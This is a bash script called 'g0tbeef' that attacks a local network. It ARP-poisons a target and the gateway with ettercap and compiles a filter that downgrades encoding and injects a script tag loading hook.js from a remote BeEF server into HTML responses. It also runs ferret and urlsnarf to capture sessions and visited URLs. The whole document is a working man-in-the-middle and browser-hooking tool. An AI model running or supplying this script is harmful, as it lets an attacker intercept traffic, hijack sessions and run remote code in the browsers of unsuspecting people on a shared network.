#!/bin/bash

fhelp()
{
	echo """g0tbeef - Inject Beef hooks into html responses
	
Usage - g0tbeef <options>
		-t <ip> 	~  ip extension to target
		-r <ip> 	~  full ip of remote beef server
		-p <port>	~  port of remote beef server

Examples
		g0tbeef -t 2								
		  ~  Attack xx.xx.xx.2
		g0tbeef -r googlebeefhook.com -p 80	
		  ~  Use beef hook at http://googlebeefhook.com:80/hook.js
";exit
}

ACNT=1																	#Parse command line arguments
for ARG in $@
do
	ACNT=$((ACNT + 1))
	case $ARG in "-h")fhelp;;"--help")fhelp;;"-r")IP=$(echo $@ | cut -d " " -f $ACNT);;"-p")PORT=$(echo $@ | cut -d " " -f $ACNT);;"-t")TARG=$(echo $@ | cut -d " " -f $ACNT);esac
done

echo 1 > /proc/sys/net/ipv4/ip_forward
ROUTE=$(route -n | grep Gate -A 1 | grep 0.0 | cut -d "." -f 4-7 | tr -d ' ')
ROUTE=${ROUTE:1:-1}
LAN=$(echo $ROUTE | cut -d '.' -f 1-3)'.'
NIC=$(ifconfig | grep $LAN -B 1 | cut -d ' ' -f 1 | head -n 1)
if [ $IP -z ] 2> /dev/null
then
	IP=$(ifconfig | grep $LAN | cut -d ':' -f 2 | cut -d ' ' -f 1)
fi
if [ $PORT -z ] 2> /dev/null
then
	PORT=3000
fi
if [ $TARG -z ] 2> /dev/null
then
	echo
	read -p " [*] Enter the IP of your target (Empty for all) $LAN" TARG
fi
if [ $TARG -z ] 2> /dev/null
then
	TARG=""
else
	TARG=$LAN$TARG
fi

echo 'if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Hackers!"); 
      msg("Bypassed Accept-Encoding!\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   replace("</head>", "<script type="text/javascript" src="http://'"$IP"':'"$PORT"'/hook.js"> </script> </head>");
   msg("JavaScript Injected!.\n");
}' > etter.filter.jsinject

xterm -e "ferret -i $NIC"&
xterm -e "urlsnarf -i $NIC"&
etterfilter etter.filter.jsinject -o jsinject.ef 2> /dev/null
sleep 4 && echo " [*] Beef Hook: http://$IP:$PORT/hook.js" && echo " [*] Filter Activated, waiting for requests..." && echo " [*] Press 'q' to quit" && echo&
ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ /$ROUTE/
killall ferret
killall urlsnarf
